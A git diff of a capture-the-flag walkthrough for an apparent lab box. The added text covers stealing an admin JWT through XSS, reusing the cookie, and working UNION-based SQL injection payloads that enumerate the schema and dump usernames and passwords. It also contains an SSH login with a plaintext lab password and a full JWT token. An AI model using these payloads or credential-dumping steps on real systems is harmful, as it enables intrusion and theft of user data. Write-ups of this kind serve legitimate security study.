@@ -28,10 +28,6 @@
 gobuster dir -u http://$VICTIM:32768 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
 ```
 
-##
-
-##
-
 ## TCP/32768 - HTTP
 
 **Kali**
@@ -40,19 +36,9 @@ gobuster dir -u http://$VICTIM:32768 -w /usr/share/wordlists/SecLists/Discovery/
 gobuster dir -u http://$VICTIM:32768 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
 ```
 
-
-
-
-
-
-
-
-
-
-
 <figure><img src="../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>
 
-
+## XSS - Steal JVT
 
 [https://jwt.io/](https://jwt.io/)
 
@@ -73,6 +59,8 @@ I tried updating the token it didn't work
 <figure><img src="../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>
 
 
+
+Next we're going to try to steal the JWT from another user.
 
 **Kali**
 
@@ -98,7 +86,7 @@ we got a token from a user that isn't us
 
 
 
-We can see it is from micheal who is an admin.
+We can see it is from Michael who is an admin.
 
 <figure><img src="../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>
 
@@ -122,14 +110,144 @@ The script was printing the flag
 
 <figure><img src="../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>
 
+This wasn't working before but after next time I went to this box tried I could just update the cookie from the browser and it worked.
+
+<figure><img src="../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>
+
+**Brower cookie**
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDE1MjgzODN9.O8218jJ0nmWedeewklX6fkb9sjlgH81ciU7dJG5l9YY
+```
+
+
+
+We add a order by and increase the number until we get an error to reveal how many fields there are.
+
+<figure><img src="../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>
+
+After 5 it give us an error so we know there are four fields
+
+<figure><img src="../../.gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>
+
+We do a union select, first to try to show our 1s which isn't working because the first part of the statement runs successfully so theres no where to put our info
+
+<figure><img src="../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>
+
+To work around this we make the userid as 0 which probably doesn't exist and we can start seeing our 1s
+
+<figure><img src="../../.gitbook/assets/image (542).png" alt=""><figcaption></figcaption></figure>
+
+Get Version
+
+<figure><img src="../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>
+
+
+
+Get Database
+
+<figure><img src="../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+Get tables
+
+```
+UNION SELECT table_name,1,1,1 FROM information_schema.tables WHERE table_schema=database()
+```
+
+<figure><img src="../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>
+
+Get All tables by concat
+
+```
+-1 UNION SELECT group_concat(table_name),1,1,1%20 FROM information_schema.tables WHERE table_schema =database()
+```
+
+<figure><img src="../../.gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+Get Columns for table users
+
+```
+-1%20UNION%20SELECT%20group_concat(column_name,column_type),1,1,1%20%20FROM%20information_schema.columns%20WHERE%20table_schema=marketplace
+```
+
+<figure><img src="../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>
+
+Get Columns for table items
+
+```
+-1 UNION SELECT group_concat(column_name,column_type),1,1,1 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='items' AND table_schema='marketplace'
+```
+
+<figure><img src="../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>
+
+Get Columns for table messages
+
+```
+-1 UNION SELECT group_concat(column_name,column_type),1,1,1 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='messages' AND table_schema='marketplace'
+```
+
+<figure><img src="../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>
+
+Get Columns for table messages
+
+```
+-1%20UNION%20SELECT%20group_concat(message_content),1,1,1%20FROM%20messages
+```
+
+<figure><img src="../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>
+
+
+
+Get usernames and passwords. The passwords aren't too useful at this point but now we have some usernames.
+
+```
+-1%20UNION%20SELECT%20group_concat(username,%27|%27,password),1,1,1%20FROM%20users
+```
+
+<figure><img src="../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+<figure><img src="../../.gitbook/assets/image (544).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+<figure><img src="../../.gitbook/assets/image (545).png" alt=""><figcaption></figcaption></figure>
+
+## TCP/22 - SSH
+
 **Kali**
 
 ```
-apt update
-apt install --only-upgrade firefox
+ssh jake@$VICTIM
+Password: @b_ENXkGYUCAv3zJ
 ```
 
-```
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDE0NDQyMjF9.xj3pmRY59AwEUvay9LA4qUY-lZWEmvXOW8wewbyPetE
-```
+<figure><img src="../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
 
